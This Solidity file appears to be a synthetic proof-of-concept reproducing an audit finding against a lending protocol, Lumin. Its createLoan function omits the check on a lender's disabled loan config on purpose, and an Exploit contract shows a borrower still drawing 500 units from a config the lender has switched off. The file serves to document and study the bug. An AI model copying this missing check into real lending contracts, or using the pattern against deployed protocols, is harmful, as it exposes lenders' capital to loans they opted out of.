// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Lumin — [H-01] Disabled lender's loan configuration can be used by a
    borrower (Pashov Audit Group, 2023-09, finding #27234)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable LoanManager::createLoan function is inlined VERBATIM (it never
    reads `LoanConfig.enabled`). No fork, no RPC, no cheatcodes.

    ROOT CAUSE: `LoanConfig.enabled` is set to `true` when a lender creates a
    loan config and can be flipped to `false` via
    `updateLoanConfigEnabledStatus`. But `createLoan` never reads `enabled` —
    a borrower can keep drawing new loans against a config the lender has
    explicitly disabled. The lender's only lever to stop further exposure to
    her allocated capital never actually works.

    Numbers kept exact & simple (abstract units):
      - Alice (lender) allocates 1000 to a new loan config.
      - Alice immediately DISABLES the config, intending to stop any further
        loan from touching her capital and to reclaim it.
      - Bob (borrower) calls createLoan against the disabled config anyway
        and receives 500 — the bug.
      - Alice then withdraws what remains of her allocation: only 500,
        instead of the full 1000 she expected the instant she disabled the
        config. Her capital was committed to a loan she explicitly opted out
        of, and she cannot reclaim it.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the underlying principal asset.
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "ERC20: insufficient balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            require(allowance[from][msg.sender] >= amt, "ERC20: insufficient allowance");
            allowance[from][msg.sender] -= amt;
        }
        require(balanceOf[from] >= amt, "ERC20: insufficient balance");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduction of Lumin's LoanConfigManager + LoanManager. A lender
///         allocates capital to a `LoanConfig` and can disable it; borrowers
///         draw loans against a config's `availablePrincipal`. Interest,
///         collateral, and repayment bookkeeping are out of scope for this
///         finding and are omitted.
contract LoanManager {
    struct LoanConfig {
        address lender;
        bool enabled;
        uint256 availablePrincipal;
    }

    struct Loan {
        uint256 configId;
        address borrower;
        uint256 principalAmount;
    }

    MockToken public token;
    uint256 public loanConfigCounter;
    uint256 public loanCounter;
    mapping(uint256 => LoanConfig) public loanConfigs;
    mapping(uint256 => Loan) public loans;

    constructor(MockToken _token) {
        token = _token;
    }

    /// @notice Lender allocates `principal` capital to a new loan config.
    function createLoanConfig(uint256 principal) external returns (uint256 configId) {
        token.transferFrom(msg.sender, address(this), principal);
        configId = ++loanConfigCounter;
        loanConfigs[configId] = LoanConfig({lender: msg.sender, enabled: true, availablePrincipal: principal});
    }

    /// @notice Lender's only lever to stop further loans against her config.
    function updateLoanConfigEnabledStatus(uint256 configId, bool enabled) external {
        LoanConfig storage config = loanConfigs[configId];
        require(config.lender == msg.sender, "not lender");
        config.enabled = enabled;
    }

    /// @notice Reduction of LoanManager::createLoan. `config.enabled` is
    ///         fetched into `config` but NEVER checked before drawing down
    ///         `availablePrincipal` — the exact bug the finding blames.
    function createLoan(uint256 configId, uint256 principalAmount) external returns (uint256 loanId) {
        LoanConfig storage config = loanConfigs[configId]; // @> VULN: config.enabled is fetched but never checked below
        require(principalAmount <= config.availablePrincipal, "exceeds available principal");
        config.availablePrincipal -= principalAmount;
        loanId = ++loanCounter;
        loans[loanId] = Loan({configId: configId, borrower: msg.sender, principalAmount: principalAmount});
        token.transfer(msg.sender, principalAmount);
    }

    /// @notice Lender reclaims whatever of her config's capital was never lent out.
    function withdrawAvailable(uint256 configId) external returns (uint256 amount) {
        LoanConfig storage config = loanConfigs[configId];
        require(config.lender == msg.sender, "not lender");
        amount = config.availablePrincipal;
        config.availablePrincipal = 0;
        token.transfer(msg.sender, amount);
    }
}

/// @notice Thin actor contract so each participant (Alice/Bob) has its own
///         address and its own token balance.
contract Actor {
    MockToken public token;
    LoanManager public lm;

    constructor(MockToken _token, LoanManager _lm) {
        token = _token;
        lm = _lm;
    }

    function createLoanConfig(uint256 principal) external returns (uint256 configId) {
        token.mint(address(this), principal);
        token.approve(address(lm), principal);
        configId = lm.createLoanConfig(principal);
    }

    function disable(uint256 configId) external {
        lm.updateLoanConfigEnabledStatus(configId, false);
    }

    function borrow(uint256 configId, uint256 amount) external returns (uint256 loanId) {
        loanId = lm.createLoan(configId, amount);
    }

    function withdrawAvailable(uint256 configId) external returns (uint256 amount) {
        amount = lm.withdrawAvailable(configId);
    }
}

/// @notice Attack orchestrator / deployer. Deploys the whole scene and runs
///         the disabled-config borrow end-to-end, asserting the finding's
///         HARM with require().
contract Exploit {
    uint256 public constant ALICE_ALLOCATION = 1000;
    uint256 public constant BOB_BORROW = 500;

    MockToken public token; // CREATE nonce 1
    LoanManager public lm; // CREATE nonce 2 (vulnerable)
    Actor public alice; // CREATE nonce 3 (lender, tries to halt lending)
    Actor public bob; // CREATE nonce 4 (borrower, exploits the missing check)

    uint256 public configId;
    uint256 public bobBorrowed;
    uint256 public aliceReclaimed;

    constructor() {
        token = new MockToken();
        lm = new LoanManager(token);
        alice = new Actor(token, lm);
        bob = new Actor(token, lm);
    }

    function run() external {
        // 1. Alice allocates 1000 to a new loan config.
        configId = alice.createLoanConfig(ALICE_ALLOCATION);

        // 2. Alice immediately disables it — she wants NO further loans
        //    drawn against her capital, intending to reclaim all 1000.
        alice.disable(configId);
        (, bool enabled,) = lm.loanConfigs(configId);
        require(!enabled, "config not disabled");

        // 3. Bob borrows against the disabled config anyway — the bug.
        bob.borrow(configId, BOB_BORROW);
        bobBorrowed = token.balanceOf(address(bob));

        // ---- HARM: a disabled config was still borrowed against ----
        require(bobBorrowed == BOB_BORROW, "bob did not borrow from disabled config");

        // 4. Alice tries to reclaim her allocation. She disabled the config
        //    BEFORE any borrow — she expects the full 1000 back.
        aliceReclaimed = alice.withdrawAvailable(configId);

        // ---- HARM: Alice's capital was committed to a loan she explicitly
        //      opted out of, and she can only reclaim half of it. ----
        require(aliceReclaimed == ALICE_ALLOCATION - BOB_BORROW, "alice reclaimed the full allocation - bug not triggered");
        require(aliceReclaimed < ALICE_ALLOCATION, "disabling successfully protected alice's capital");
    }
}
